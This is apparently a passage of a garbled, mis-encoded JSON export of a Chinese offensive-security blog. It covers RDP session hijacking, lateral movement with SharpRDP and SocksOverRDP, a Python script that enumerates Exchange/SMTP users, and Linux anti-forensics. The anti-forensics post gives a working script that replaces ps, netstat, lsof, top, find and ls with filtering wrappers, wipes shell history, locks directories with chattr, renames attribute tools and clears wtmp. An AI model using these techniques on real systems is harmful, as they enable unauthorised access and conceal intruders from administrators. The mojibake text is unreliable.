å½“æœåŠ¡å¯åŠ¨æ—¶ï¼Œå¯ä»¥åœ¨ä¸çŸ¥é“å¯†ç çš„æƒ…å†µä¸‹ä½¿ç”¨â€adminxâ€ç”¨æˆ·çš„ä¼šè¯ï¼Œè¾¾åˆ°RDPä¼šè¯åŠ«æŒã€‚ 1sc start rdp åˆ©ç”¨è¿‡ç¨‹-å·¥å…· SharpRDPHijackï¼ŒC#å¼€å‘çš„è¿œç¨‹æ¡Œé¢åè®®(RDP)ä¼šè¯åŠ«æŒå·¥å…·ï¼Œç”¨äºè¿æ¥æ–­å¼€çš„ç”¨æˆ·ä¼šè¯ã€‚ é˜²æ­¢ RDP åŠ«æŒ å¼ºåˆ¶æ‰§è¡Œç»„ç­–ç•¥ï¼šé€šè¿‡ç»„ç­–ç•¥æ§åˆ¶è¿œç¨‹ä¸»æœºç©ºé—²æ—¶é—´è‡ªåŠ¨æ–­å¼€å¹¶æ³¨é”€ã€‚ è¿è¡Œ &gt; gpedit.msc &gt; æœ¬åœ°è®¡ç®—æœº ç­–ç•¥ &gt; è®¡ç®—æœºé…ç½® &gt; ç®¡ç†æ¨¡æ¿ &gt; Windows ç»„ä»¶ &gt; è¿œç¨‹æ¡Œé¢æœåŠ¡ &gt; è¿œç¨‹æ¡Œé¢ä¼šè¯ä¸»æœº &gt; ä¼šè¯æ—¶é—´é™åˆ¶ å¯åŠ¨è¿›ç¨‹ç›‘æ§ tscon.exe çš„ä½¿ç”¨ï¼Œå¹¶ç›‘æ§åœ¨å…¶å‚æ•°ä¸­ä½¿ç”¨ cmd.exe /k æˆ– cmd.exe /c çš„æœåŠ¡åˆ›å»ºï¼Œä»¥é˜²æ­¢ RDP ä¼šè¯åŠ«æŒã€‚ Reference SharpRDPHijack RDP hijacking attacks","categories":[{"name":"Skills","slug":"Skills","permalink":"https://payloads.cn/categories/Skills/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://payloads.cn/tags/Windows/"}]},{"title":"æ¨ªå‘ç§»åŠ¨ä¸­RDPåè®®çš„åˆ©ç”¨","slug":"æ¨ªå‘ç§»åŠ¨ä¸­RDPåè®®çš„åˆ©ç”¨","date":"2021-07-14T09:30:54.000Z","updated":"2021-08-06T02:56:10.977Z","comments":true,"path":"2021/0714/.html","link":"","permalink":"https://payloads.cn/2021/0714/.html","excerpt":"","text":"å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚ â€”â€”AnonySec https://payloads.cn SocksOverRDP å·¥å…·åœ°å€https://github.com/nccgroup/SocksOverRDPï¼Œæ­¤å·¥å…·åœ¨ RDP åè®®çš„åŸºç¡€ä¸Šå®ç°äº† Socks ä»£ç†åŠŸèƒ½ã€‚ æµ‹è¯•è¿‡ç¨‹å®¢æˆ·ç«¯IPï¼š172.16.54.4 é…ç½®RDP Client å®‰è£…æ³¨å†ŒDLLï¼š 1regsvr32.exe SocksOverRDP-Plugin.dll å–æ¶ˆæ³¨å†Œï¼š 1regsvr32.exe &#x2F;u SocksOverRDP-Plugin.dll åœ¨ RDP Client ä¸­å¯åŠ¨ mstsc.exe æ—¶çœ‹åˆ°å¦‚ä¸‹æç¤ºï¼š (é»˜è®¤æƒ…å†µä¸‹ï¼Œå®¢æˆ·ç«¯ç»„ä»¶*.dll* é…ç½®ä¸ºä»…åœ¨ localhost ä¸Šä¾¦å¬) æ›´æ”¹é»˜è®¤ç›‘å¬çš„IP æ³¨å†Œè¡¨ä½ç½®ï¼šHKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Terminal Server Client\\Default\\AddIns\\SocksOverRDP-Plugin (ç”± .dll åœ¨æ³¨å†Œæ—¶è‡ªè¡Œå®‰è£…ï¼Œæˆ–è€…éœ€è¦ä»SocksOverRDP-Plugin.regå¯¼å…¥) å¯ç”¨ï¼š0ç¦ç”¨ï¼Œ1å¯ç”¨é»˜è®¤ (é»˜è®¤æƒ…å†µä¸‹ï¼Œå¤„äºå¯ç”¨çŠ¶æ€ï¼Œæ¯æ¬¡å¯åŠ¨è¿æ¥æ—¶éƒ½ä¼šåœ¨å¼¹å‡ºæ¶ˆæ¯æ¡†) ip : è¦è¿æ¥æˆ–ç»‘å®šåˆ°çš„IP port : è¿æ¥æˆ–ç»‘å®šåˆ°çš„ç«¯å£ æœåŠ¡ç«¯IPï¼š172.16.54.9 è¾“å…¥å£ä»¤ï¼ŒæˆåŠŸè¿æ¥RDPï¼Œä¹‹ååœ¨Serverä¸­è¿è¡ŒSocksOverRDP-Server.exeã€‚ åˆ©ç”¨Proxifieræµ‹è¯•RDPéš§é“çŠ¶æ€ã€‚ åˆ©ç”¨åœºæ™¯åªæœ‰ tcp/udp 3389 ç«¯å£å¯ä»¥è¿›è¡Œé€šä¿¡æ—¶ï¼Œå¯ä»¥åˆ©ç”¨ RDP åè®®ï¼Œå»ºç«‹ Socks é€šé“ã€‚ SharpRDPåœ¨ä¸é€šè¿‡ GUI å®¢æˆ·ç«¯å’Œ Socks ä»£ç†çš„æƒ…å†µä¸‹ï¼ŒåŸºäº RDP åè®®è¿›è¡Œæ¨ªå‘ç§»åŠ¨ã€‚ Windows ä¸­æœ‰ä¸€ä¸ªåº“ mstscax.dllï¼Œå¯ä»¥æ‰§è¡Œä»»ä½• RDP åŠŸèƒ½ã€‚æ­¤ DLL æ˜¯ Microsoft ç»ˆç«¯æœåŠ¡çš„ ActiveX COM åº“ï¼Œé€šè¿‡åˆ©ç”¨æ­¤ DLLï¼Œå¯ä»¥åˆ›å»ºæ§åˆ¶å°åº”ç”¨ç¨‹åºï¼Œè¯¥æ§åˆ¶å°åº”ç”¨ç¨‹åºé€šè¿‡ RDP æ‰§è¡Œç»è¿‡èº«ä»½éªŒè¯çš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼Œè€Œæ— éœ€ GUI å®¢æˆ·ç«¯æˆ– SOCKS ä»£ç†ã€‚ å·¥å…·åœ°å€https://github.com/0xthirteen/SharpRDPï¼Œä¸‹è½½åç›´æ¥ç”¨ Visual Studio ç¼–è¯‘è¿è¡Œå³å¯ã€‚ æµ‹è¯•è¿‡ç¨‹1SharpRDP.exe computername&#x3D;172.16.54.4 username&#x3D;administrator password&#x3D;admin@123 command&#x3D;&quot;calc.exe&quot; åˆ©ç”¨ä¸Šè¿°æ–¹æ³•æ‰§è¡Œå‘½ä»¤åï¼Œæ‰€æ‰§è¡Œå‘½ä»¤ä¼šéšè—åœ¨ RDP åè®®ä¸­ã€‚ ã€æ³¨ï¼šä½¿ç”¨ SharpRDP æˆåŠŸæ‰§è¡Œå‘½ä»¤åï¼Œç›®æ ‡æœºä¼šå‡ºç°é”å±çŠ¶æ€ ã€‘ åˆ©ç”¨åœºæ™¯åœ¨ä¸ä½¿ç”¨ä¼ ç»Ÿçš„ RDP å®¢æˆ·ç«¯ GUI æƒ…å†µä¸‹ï¼Œåˆ©ç”¨RDPè¿›è¡Œæ¨ªå‘ç§»åŠ¨ï¼Œä¸”ç›®æ ‡åªæœ‰ 3389 ç«¯å£å¯ä»¥è¿›è¡Œé€šä¿¡æ—¶ã€‚å…¶æ¬¡ï¼Œå¯ä»¥åœ¨æ²¡æœ‰ç³»ç»Ÿæœ¬åœ°ç®¡ç†æƒé™ä½†æ‹¥æœ‰è¯¥ç³»ç»Ÿçš„ RDP æƒé™æ—¶ä½¿ç”¨è¯¥å·¥å…·ã€‚ Reference Tool Release â€“ Socks Over RDP Lateral Movement over headless RDP with SharpRDP","categories":[{"name":"Skills","slug":"Skills","permalink":"https://payloads.cn/categories/Skills/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://payloads.cn/tags/Windows/"}]},{"title":"éªŒè¯Exchangeé‚®ç®±ç”¨æˆ·æ˜¯å¦å­˜åœ¨","slug":"éªŒè¯Exchangeé‚®ç®±ç”¨æˆ·æ˜¯å¦å­˜åœ¨","date":"2021-07-06T06:56:32.000Z","updated":"2021-07-07T07:32:05.601Z","comments":true,"path":"2021/0706/.html","link":"","permalink":"https://payloads.cn/2021/0706/.html","excerpt":"","text":"å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚ â€”â€”AnonySec https://payloads.cn SMTP ç®€å•é‚®ä»¶ä¼ è¾“åè®®ï¼ˆSimple Mail Transfer Protocolï¼ŒSMTPï¼‰æ˜¯åœ¨Internetä¼ è¾“ç”µå­é‚®ä»¶çš„äº‹å®æ ‡å‡†ã€‚SMTPæ˜¯ä¸€ä¸ªç›¸å¯¹ç®€å•çš„åŸºäºæ–‡æœ¬çš„åè®®ã€‚åœ¨å…¶ä¹‹ä¸ŠæŒ‡å®šäº†ä¸€æ¡æ¶ˆæ¯çš„ä¸€ä¸ªæˆ–å¤šä¸ªæ¥æ”¶è€…ï¼ˆåœ¨å¤§å¤šæ•°æƒ…å†µä¸‹è¢«ç¡®è®¤æ˜¯å­˜åœ¨çš„ï¼‰ï¼Œç„¶åæ¶ˆæ¯æ–‡æœ¬ä¼šè¢«ä¼ è¾“ã€‚å¯ä»¥å¾ˆç®€å•åœ°é€šè¿‡telnetç¨‹åºæ¥æµ‹è¯•ä¸€ä¸ªSMTPæœåŠ¡å™¨ã€‚SMTPä½¿ç”¨TCPç«¯å£25ã€‚è¦ä¸ºä¸€ä¸ªç»™å®šçš„åŸŸåå†³å®šä¸€ä¸ªSMTPæœåŠ¡å™¨ï¼Œéœ€è¦ä½¿ç”¨MX (Mail eXchange) DNSã€‚â€”â€”æ‘˜è‡ª ç™¾åº¦ç™¾ç§‘ åŸç†ä½¿ç”¨ SMTP RCPT TOï¼šè¿”å›250çŠ¶æ€ç ï¼Œè¯æ˜é‚®ç®±åœ°å€å­˜åœ¨ï¼›è¿”å›550çŠ¶æ€ç ï¼Œè¯æ˜é‚®ç®±åœ°å€ä¸å­˜åœ¨ã€‚ æ³¨æ„æœ‰äº›å…¬å¸å°†é‚®ç®±æœåŠ¡è®¾ç½®ä¸ºCatch-allï¼Œè¿™æ„å‘³è¯¥åŸŸåä¸‹çš„æ¯ä¸ªé‚®ç®±åœ°å€ï¼Œéƒ½ä¼šè¢«è®¤ä¸ºæ˜¯å­˜åœ¨çš„ã€‚ Catch-allCatch-allé‚®ç®±ï¼šå…¨åŸŸè®¾ç½® (ä»¥è¯¥é‚®ç®±ä¸ºåç¼€çš„ä»»ä½•é‚®ç®±åï¼Œè¯¥é‚®ç®±æœåŠ¡å™¨éƒ½ä¼šæ¥æ”¶)ä¾‹å¦‚è¿™ä¸ªåŸŸmicrosci.comï¼Œä¼šè®¾ç½®ä¸€ä¸ªCatch-allé‚®ç®±åœ°å€å¦‚: &#x69;&#x6e;&#102;&#111;&#x40;&#x6d;&#105;&#x63;&#114;&#x6f;&#x73;&#99;&#x69;&#46;&#99;&#111;&#109;ï¼Œè¯¥åœ°å€å¯ä»¥ç”¨æ¥æ¥æ”¶æ‹¼é”™æˆ–è€…æ— æ•ˆçš„æ¥è‡ªmicrosci.comåŸŸçš„é‚®ç®±ã€‚å¦‚sales1@microsci.comæ˜¯ä¸å­˜åœ¨æ— æ•ˆçš„è´¦æˆ·ã€‚å½“ç»™è¿™ä¸ªé‚®ç®±&#115;&#97;&#x6c;&#x65;&#x73;&#x31;&#64;&#109;&#105;&#x63;&#114;&#111;&#115;&#99;&#x69;&#46;&#99;&#x6f;&#109;å‘é‚®ä»¶æ—¶ï¼Œç”±äº&#x73;&#97;&#x6c;&#x65;&#115;&#49;&#x40;&#x6d;&#105;&#99;&#114;&#111;&#x73;&#99;&#x69;&#46;&#99;&#x6f;&#109;é‚®ç®±ä¸å­˜åœ¨å°±ä¼šæŠŠé‚®ä»¶è‡ªåŠ¨è½¬åˆ°&#x69;&#110;&#x66;&#x6f;&#64;&#x6d;&#x69;&#99;&#114;&#x6f;&#115;&#x63;&#x69;&#x2e;&#99;&#111;&#x6d; (Catch-allé‚®ç®±é‡Œ)ã€‚è¿™æ ·çš„è¯ï¼Œå°±é€ æˆæ£€æµ‹è¯¥åŸŸçš„é‚®ç®±éƒ½æ˜¯é€šè¿‡çš„ã€‚å› ä¸ºè¯¥åŸŸçš„é‚®ç®±ä¼šæ¥å—è¯¥åŸŸä¸‹çš„æ‰€æœ‰é‚®ç®±ã€‚ç„¶è€Œä¹Ÿæœ‰è¿™æ ·çš„æƒ…å†µï¼Œæ”¶ä»¶äººé‚®ä»¶æœåŠ¡å™¨å¯èƒ½ä¼šé»˜é»˜åœ°æ”¾å¼ƒè¯¥é‚®ä»¶æˆ–äº‹åå‘é€é€€å›é‚®ä»¶ã€‚[ å¦‚ä½•é…ç½®catch-allï¼Œå®˜ç½‘æ–‡æ¡£ é…ç½® catch-all é‚®ç®± ] éªŒè¯è¿‡ç¨‹æŸ¥æ‰¾MXè®°å½•1nslookup -type&#x3D;MX mail.com æ‰¾åˆ°ä¸¤æ¡MXè®°å½•ï¼ŒSMTPæœåŠ¡å™¨çš„åœ°å€åˆ†åˆ«ä¸ºï¼šmail.com mail exchanger = 10 mx2.mail.com.mail.com mail exchanger = 10 mx.mail.com. å»ºç«‹è¿æ¥SMTPé»˜è®¤æ˜¯TCPç«¯å£25ï¼Œä½¿ç”¨telnetå‘½ä»¤è¿›è¡ŒTCPçš„è¿æ¥ã€‚ 12345â¯ telnet mx.mail.com 25Trying 180.xx.xx.199...Connected to mx.mail.com.Escape character is &#39;^]&#39;.220 mx.mail.com ESMTP å“åº”ç 220ï¼Œè¯æ˜è¿æ¥æˆåŠŸã€‚ HELO/EHLOå‘æœåŠ¡å™¨è¡¨æ˜é‚®ä»¶å‘é€çš„æœåŠ¡å™¨ 12345678â¯ HELO mx.mail.com250 mx.mail.comâ¯ EHLO mx.mail.com250-mx.mail.com250-8BITMIME250-SIZE 68157440250 STARTTLS å“åº”ç 250ï¼Œè¯æ˜æˆåŠŸã€‚ MAIL FROMè¡¨æ˜å‘ä»¶äºº 12MAIL FROM:&lt;test@mail.com&gt;250 sender &lt;test@mail.com&gt; ok RCPT TOå¦‚æœ RCPT TO çš„å“åº”ç æ˜¯250æˆ–è€…251éƒ½è¡¨ç¤ºé‚®ä»¶åœ°å€å­˜åœ¨ï¼Œå¦‚æœå“åº”ç æ˜¯5xxï¼Œåˆ™è¡¨æ˜é‚®ä»¶åœ°å€ä¸å­˜åœ¨ï¼Œå¦‚æœæ˜¯4xxåˆ™ä»£è¡¨æ— æ³•ç¡®è®¤ã€‚ 12345678â¯ MAIL FROM:&lt;test@mail.com&gt;250 sender &lt;test@mail.com&gt; okâ¯ RCPT TO:&lt;mailsec@mail.com&gt;250 recipient &lt;mailsec@mail.com&gt; okâ¯ RCPT TO:&lt;mail@mail.com&gt;550 #5.1.0 Address rejected. å·¥å…·åŒ–Python Metasploitå¼€ç¯‡æåˆ°è¿‡ Catch-all ã€‚å®é™…ä¸Šï¼ŒMAILæœåŠ¡å™¨å¦‚æœåšäº†è¿™ç§é…ç½®ï¼Œä»»ä½•é‚®ç®±åœ°å€é€šè¿‡SMTPè¿™ç§æ–¹æ³•éƒ½ä¼šæ ¡éªŒé€šè¿‡ã€‚å¯ä»¥ä½¿ç”¨MSFçš„ auxiliary/scanner/msmail/onprem_enum æ¨¡å—è¿›è¡ŒéªŒè¯ï¼Œè¯¥æ¨¡å—åˆ©ç”¨OWA (Outlook Webapp)åŸºäºæ—¶é—´çš„ç”¨æˆ·æšä¸¾ã€‚[ ä½œè€…æ–‡æ¡£ onprem_enum.md ] é™„: Pythonä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142# -*- coding: utf-8 -*-import dns.resolverimport argparsefrom socket import *import randomdef ColorPrint(string=&quot;&quot;, flag=&quot;&quot;, verbose=&quot;&quot;): colors = &#123; u&quot;gray&quot;: &quot;2&quot;, u&quot;red&quot;: &quot;31&quot;, u&quot;green&quot;: &quot;32&quot;, u&quot;yellow&quot;: &quot;33&quot;, u&quot;blue&quot;: &quot;34&quot;, u&quot;pink&quot;: &quot;35&quot;, u&quot;cyan&quot;: &quot;36&quot;, u&quot;white&quot;: &quot;37&quot;, &#125; flags = &#123; u&quot;error&quot;: &quot;[-] &quot;, u&quot;warning&quot;: &quot;[!] &quot;, u&quot;info&quot;: &quot;[*] &quot;, u&quot;success&quot;: &quot;[+] &quot;, u&quot;debug&quot;: &quot;&gt;&gt;&gt; &quot;, u&quot;echo&quot;: &quot;&gt;&gt;&gt; &quot; &#125; try: if flag == &#x27;error&#x27;: print(u&quot;\\033[%sm%s%s&quot; % (colors[u&quot;red&quot;], flags[flag], string)) if flag ==&quot;info&quot;: print(u&quot;\\033[%sm%s%s&quot; % (colors[u&quot;white&quot;], flags[flag], string)) if flag == &#x27;echo&#x27; or flag == &#x27;&#x27; or flag == 0: print(u&quot;\\033[%sm%s%s&quot; % (colors[u&quot;white&quot;], flags[flag], string)) if flag == &#x27;success&#x27;: print(u&quot;\\033[%sm%s%s&quot; % (colors[u&quot;green&quot;], flags[flag], string)) if verbose == 1: if flag == &#x27;warning&#x27;: print(u&quot;\\033[%sm%s%s&quot; % (colors[u&quot;yellow&quot;], flags[flag], string)) if flag == &#x27;debug&#x27;: print(u&quot;\\033[%sm%s%s&quot; % (colors[u&quot;white&quot;], flags[flag], string)) except: return 0# ç¬¬ä¸€æ­¥: è·å–åŸŸåMX è®°å½•def DNSQuery(mailaddr): dns_resolver = dns.resolver.Resolver(configure=False) dns_resolver.timeout = 5 dns_resolver.lifetime = 5 dns_resolver.nameservers = [&#x27;119.29.29.29&#x27;] record = &quot;MX&quot; domain = mailaddr[mailaddr.find(u&quot;@&quot;) + 1:] ColorPrint(&quot;query MX of DNS for %s&quot; % domain, flag= &quot;echo&quot;, verbose=verbose) try: MX = dns_resolver.resolve(domain, record) m = random.randint(0, len(MX)) mx = MX[0].exchange strMx = str(mx)[:-1] assert strMx != u&quot;&quot; except Exception as e: ColorPrint(&quot;query MX of %s failed: %s&quot; % (strMx, e), flag=&quot;error&quot;, verbose=verbose) return 0 ColorPrint(&quot;MX Server: %s&quot; % strMx, flag=&quot;info&quot;, verbose=verbose) return strMx# ç¬¬äºŒæ­¥: è¯·æ±‚mailæœåŠ¡å™¨def smtpsend(server, port=20, mail_rcptTo=&quot;&quot;): mailserver = (server, port) clientSocket = socket(AF_INET, SOCK_STREAM) helloDomain = server[server.find(u&quot;.&quot;) + 1:] mail_from = &quot;mail@gmail.com&quot; ColorPrint(&quot;connect to %s:%.f&quot; % (server, port), flag=&quot;debug&quot;, verbose=verbose) try: clientSocket.connect(mailserver) recv = clientSocket.recv(1024) recv = recv.decode() if recv[0:3] != &#x27;220&#x27;: ColorPrint(&quot;info: &quot; + recv, flag=&quot;debug&quot;, verbose=verbose) return 0 except Exception as e: ColorPrint(&quot;Error: %s&quot; % e, flag=&quot;error&quot;, verbose=verbose) ColorPrint(&quot;Done. &quot; , flag=&quot;info&quot;, verbose=verbose) return 0 ColorPrint(&quot;Message after connection request: \\n&quot; + recv, flag=&quot;debug&quot;, verbose=verbose) hello_command = &quot;EHLO %s\\r\\n&quot; % helloDomain clientSocket.send(hello_command.encode()) recv1 = clientSocket.recv(1024) recv1 = recv1.decode() ColorPrint(&quot;Message after EHLO command:\\n&quot; + recv1, flag=&quot;debug&quot;, verbose=verbose) if recv1[:3] != &#x27;250&#x27;: ColorPrint(&quot;250 reply not received from server.&quot; + recv1, flag=&quot;error&quot;, verbose=verbose) return 0 mail_from_command = &quot;MAIL FROM:&lt;%s&gt;\\r\\n&quot; % mail_from clientSocket.send(mail_from_command.encode()) recv2 = clientSocket.recv(1024) recv2 = recv2.decode() ColorPrint(&quot;After MAIL FROM command: &quot; + recv2, flag=&quot;debug&quot;, verbose=verbose) rcptTo = &quot;RCPT TO:&lt;%s&gt;\\r\\n&quot; % mail_rcptTo clientSocket.send(rcptTo.encode()) recv3 = clientSocket.recv(1024) recv3 = recv3.decode() if recv3[:3] == &#x27;550&#x27;: ColorPrint(&quot;Account: %s does not exist.&quot; % mail_rcptTo, flag=&quot;error&quot;, verbose=verbose) ColorPrint(&quot;Done. &quot;, flag=&quot;info&quot;, verbose=verbose) return 0 ColorPrint(&quot;Account: %s exists.&quot; % mail_rcptTo, flag=&quot;success&quot;, verbose=verbose) ColorPrint(&quot;After RCPT TO command: %s&quot; % recv3, flag=&quot;debug&quot;, verbose=verbose) quit = &quot;QUIT\\r\\n&quot; clientSocket.send(quit.encode()) recv4 = clientSocket.recv(1024) clientSocket.close() ColorPrint(&quot;Done. &quot; , flag=&quot;info&quot;, verbose=verbose) return mail_rcptToif __name__ == &quot;__main__&quot;: &#x27;&#x27;&#x27; port = 25 verbose = False #è¯¦ç»†è¾“å‡º,å¯è¾“å‡ºdebugä¿¡æ¯ mailaddr = &quot;xxxx@mail.com&quot; # éœ€è¦éªŒè¯çš„é‚®ç®±åœ°å€ mail_rcptTo = mailaddr server = DNSQuery(mailaddr) smtpsend(server, port, mail_rcptTo) &#x27;&#x27;&#x27; parser = argparse.ArgumentParser() parser.add_argument(&quot;-e&quot;, &quot;--email&quot;, help=&quot;Verification Email Address.&quot;, required=True) parser.add_argument(&quot;-s&quot;, &quot;--server&quot;, help=&quot;Smtp Server.&quot;) parser.add_argument(&quot;-p&quot;, &quot;--port&quot;, help=&quot;Smtp Server Port.&quot;, default=25, type=int) parser.add_argument(&quot;-v&quot;, &quot;--verbose&quot;, help=&quot;verbose info (choice in [True, False])&quot;, default=False, type=bool) args = parser.parse_args() port = args.port verbose = args.verbose mailaddr = args.email mail_rcptTo = mailaddr server = args.server if server == None: server = DNSQuery(mailaddr) smtpsend(server, port, mail_rcptTo) ReferenceéªŒè¯é‚®ç®±ç”¨æˆ·æ˜¯å¦å­˜åœ¨","categories":[{"name":"ä¿¡æ¯æ”¶é›†","slug":"ä¿¡æ¯æ”¶é›†","permalink":"https://payloads.cn/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}],"tags":[{"name":"Mail","slug":"Mail","permalink":"https://payloads.cn/tags/Mail/"}]},{"title":"Linux éšåŒ¿æŠ€å·§","slug":"Linux-éšåŒ¿æŠ€å·§","date":"2020-12-01T04:16:00.000Z","updated":"2021-08-06T02:48:08.617Z","comments":true,"path":"2020/1201/.html","link":"","permalink":"https://payloads.cn/2020/1201/.html","excerpt":"","text":"å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚ â€”â€”AnonySec https://payloads.cn å‰è¨€åœ¨å†…ç½‘æ¸—é€æ—¶ï¼Œæœ‰æ—¶éœ€è¦å°†å·¥å…·æ”¾åœ¨ç›®æ ‡æœºè¿›ç¨‹æ‰§è¡Œï¼Œä½†è¿™é‡Œå°±éœ€è¦è€ƒè™‘éšè”½æ€§çš„é—®é¢˜ã€‚ä¸‹é¢æ‰€è®²çš„ä¸æ˜¯ä»€ä¹ˆé«˜å¤§ä¸Šçš„æŠ€æœ¯ï¼Œåªæ˜¯ä¸€äº›å¸¸ç”¨çš„æŠ€å·§ã€‚ è¿›ç¨‹éšåŒ¿netstat ä¼ªè£…é¦–å…ˆï¼ŒåŒ…è£…ä¸‹ netstat å‘½ä»¤ï¼Œps è·¯å¾„ä¸ºï¼š/usr/bin/netstat ä¹‹åï¼Œåˆ›å»º/usr/local/bin/netstatæ–‡ä»¶ï¼Œå†™å…¥å†…å®¹ï¼š 123#!/bin/bash/usr/bin/ps $@ | grep -Ev &#x27;name|address|port&#x27; æœ€åï¼Œèµ‹äºˆæ‰§è¡Œæƒé™ chmod +x /usr/local/bin/netstat æ‰§è¡Œwhich netstatçœ‹ä¸‹å‘½ä»¤å˜åŒ–ï¼š netstat å‘½ä»¤ä¿®æ”¹å‰åçš„å¯¹æ¯”ï¼š å½“æˆ‘ä»¬è‡ªå·±ä½¿ç”¨æ—¶ï¼Œç›´æ¥ç”¨/bin/netstatå°± OK äº†ã€‚ æ–‡ä»¶éšåŒ¿é¦–å…ˆï¼Œçœ‹ä¸‹ Linux chattr å‘½ä»¤ï¼Œç”¨äºæ”¹å˜æ–‡ä»¶å±æ€§ã€‚è¿™é¡¹æŒ‡ä»¤å¯æ”¹å˜å­˜æ”¾åœ¨ext2æ–‡ä»¶ç³»ç»Ÿä¸Šçš„æ–‡ä»¶æˆ–ç›®å½•å±æ€§ï¼Œè¿™äº›å±æ€§å…±æœ‰ä»¥ä¸‹8ç§æ¨¡å¼ï¼š aï¼šè®©æ–‡ä»¶æˆ–ç›®å½•ä»…ä¾›é™„åŠ ç”¨é€” bï¼šä¸æ›´æ–°æ–‡ä»¶æˆ–ç›®å½•çš„æœ€åå­˜å–æ—¶é—´ cï¼šå°†æ–‡ä»¶æˆ–ç›®å½•å‹ç¼©åå­˜æ”¾ dï¼šå°†æ–‡ä»¶æˆ–ç›®å½•æ’é™¤åœ¨å€¾å€’æ“ä½œä¹‹å¤– iï¼šä¸å¾—ä»»æ„æ›´åŠ¨æ–‡ä»¶æˆ–ç›®å½• sï¼šä¿å¯†æ€§åˆ é™¤æ–‡ä»¶æˆ–ç›®å½• Sï¼šå³æ—¶æ›´æ–°æ–‡ä»¶æˆ–ç›®å½• uï¼šé¢„é˜²æ„å¤–åˆ é™¤ å®æˆ˜ä¸­å¸¸ç”¨çš„ä¸º +a (åªèƒ½è¿½åŠ ï¼Œä¸èƒ½åˆ é™¤) ä¸ +i (ä¸èƒ½æ›´æ”¹) ï¼š è¿™é‡Œï¼Œè¿˜éœ€è¦å°† chattr ä¸ lsattr å‘½ä»¤è¿›ç¨‹éšè—ï¼š 12mv /usr/bin/chattr /usr/bin/chtmv /usr/bin/lsattr /usr/bin/lst æ–‡ä»¶æ—¶é—´ä¿®æ”¹touch -acmr /bin/ls /usr/bin/cht ( ä¿®æ”¹ åä¸€ä¸ªæ–‡ä»¶æ—¶é—´ ä¸ å‰ä¸€ä¸ªæ–‡ä»¶æ—¶é—´ ä¸€è‡´) å‚æ•° -aï¼šæ”¹å˜è®¿é—®æ—¶é—´ä¸ºå½“å‰æ—¶é—´ -mï¼šæ”¹å˜ä¿®æ”¹æ—¶é—´ä¸ºå½“å‰æ—¶é—´ -cï¼šæ–‡ä»¶ä¸å­˜åœ¨ä¸æ–°å»ºæ–‡ä»¶ -rï¼šä½¿ç”¨å‚è€ƒæ–‡ä»¶çš„æ—¶é—´ -dï¼šè®¾ç½®ä¸ºæŒ‡å®šæ—¶é—´ -tï¼šè®¾ç½®æ¡£æ¡ˆçš„æ—¶é—´è®°å½• é™„: shè„šæœ¬123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#!/bin/bash# history# unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0# pstouch /usr/local/bin/pscat &lt;&lt;EOF &gt;&gt; /usr/local/bin/ps#!/bin/bash/bin/ps \\$@ | grep -Ev &#x27;name|address|port&#x27;/usr/bin/ps \\$@ | grep -Ev &#x27;name|address|port&#x27;EOFchmod +x /usr/local/bin/ps &amp;&amp; touch -acmr /bin/ps /usr/local/bin/ps# netstattouch /usr/local/bin/netstatcat &lt;&lt;EOF &gt;&gt; /usr/local/bin/netstat#!/bin/bash/bin/netstat \\$@ | grep -Ev &#x27;name|address|port&#x27;/usr/bin/netstat \\$@ | grep -Ev &#x27;name|address|port&#x27;EOFchmod +x /usr/local/bin/netstat &amp;&amp; touch -acmr /bin/netstat /usr/local/bin/netstat# lsoftouch /usr/local/bin/lsofcat &lt;&lt;EOF &gt;&gt; /usr/local/bin/lsof#!/bin/bash/bin/lsof \\$@ | grep -Ev &#x27;name|address|port&#x27;/usr/bin/lsof \\$@ | grep -Ev &#x27;name|address|port&#x27;EOFchmod +x /usr/local/bin/lsof &amp;&amp; touch -acmr /bin/lsof /usr/local/bin/lsof# toptouch /usr/local/bin/topcat &lt;&lt;EOF &gt;&gt; /usr/local/bin/top#!/bin/bash/bin/top \\$@ | grep -Ev &#x27;name|address|port&#x27;/usr/bin/top \\$@ | grep -Ev &#x27;name|address|port&#x27;EOFchmod +x /usr/local/bin/top &amp;&amp; touch -acmr /bin/top /usr/local/bin/lsof# findtouch /usr/local/bin/findcat &lt;&lt;EOF &gt;&gt; /usr/local/bin/find #!/bin/bash/bin/find \\$@ | grep -Ev &#x27;name|address|port&#x27;/usr/bin/find \\$@ | grep -Ev &#x27;name|address|port&#x27;EOFchmod +x /usr/local/bin/find &amp;&amp; touch -acmr /bin/find /usr/local/bin/lsof# lstouch /usr/local/bin/lscat &lt;&lt;EOF &gt;&gt; /usr/local/bin/ls#!/bin/bash/bin/ls \\$@ | grep -Ev &#x27;name|address|port&#x27;/usr/bin/ls \\$@ | grep -Ev &#x27;name|address|port&#x27;EOFchmod +x /usr/local/bin/ls &amp;&amp; touch -acmr /bin/ls /usr/local/bin/ls# chattr &amp; lsattr#!/bin/bashmkdir /tmp/.tmp/chattr +a /tmp/.tmp/chattr +a /root/.ssh/mv /usr/bin/chattr /usr/bin/chtmv /usr/bin/lsattr /usr/bin/lst# last# echo &quot;&quot; &gt; /var/log/wtmp ä¿®æ”¹å‘½ä»¤å˜é‡åï¼Œé‡å¯ç»ˆç«¯ç”Ÿæ•ˆï¼Œæ‰§è¡Œåè®°å¾—åˆ é™¤shè„šæœ¬ ï¼ Reference linux shell çš„here document ç”¨æ³• (cat Â« 